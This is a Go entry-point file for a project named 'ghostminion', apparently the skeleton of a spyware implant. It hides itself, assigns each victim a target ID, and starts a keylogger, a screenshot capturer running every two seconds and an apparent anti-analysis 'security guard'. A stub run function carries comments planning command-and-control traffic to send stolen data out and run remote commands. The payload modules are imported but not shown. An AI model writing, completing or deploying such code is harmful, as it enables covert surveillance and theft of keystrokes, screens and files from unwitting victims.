package main

import (
	"fmt"
	"ghostminion/apps"
	"ghostminion/config"
	"ghostminion/db"
	"ghostminion/hider"
	"ghostminion/persistence"
	"log"
	"sync"
)

func main() {
	var wg sync.WaitGroup
	wg.Add(1) // for "run" function

	configInstance, err := config.LoadConfig("../config.yaml") //get from configPath
	if err != nil {
		panic(err)
	}

	err = hider.Hide()
	if err != nil {
		//panic(err)
	}

	err = db.Init(configInstance.Installation.DBPath, configInstance.Installation.DBPassword)
	if err != nil {
		panic(err)
	}

	targetId := persistence.GenerateTargetID()
	fmt.Println("targetId:", targetId)

	appManager := apps.NewAppManager()
	addBuiltinApps(appManager)
	appManager.StartAll(&wg)

	app, err := appManager.GetApp("security_guard")
	if err != nil {
		log.Fatalf("failed to get security_guard app: %v", err)
	}
	securityGuard, ok := app.(*apps.SecurityGuardApp)
	if !ok {
		log.Fatalf("failed to cast security_guard app to SecurityGuardApp")
	}
	for securityGuard.IsSafeToRun() {
		go run()
	}
	appManager.StopAll()
}

func addBuiltinApps(am *apps.AppManager) {
	am.AddApp("keylogger", &apps.KeyLoggerApp{})
	am.AddApp("screenshot", &apps.ScreenshotApp{Interval: 2})
	securityGuard := &apps.SecurityGuardApp{}
	securityGuard.Validate()
	am.AddApp("security_guard", securityGuard)
}

func run() {
	/* communicate with C2
	send data (how much should I send per round?)
	get requests (get them all and run) - build package for running direct commands and get files
	store the new data
	*/
}
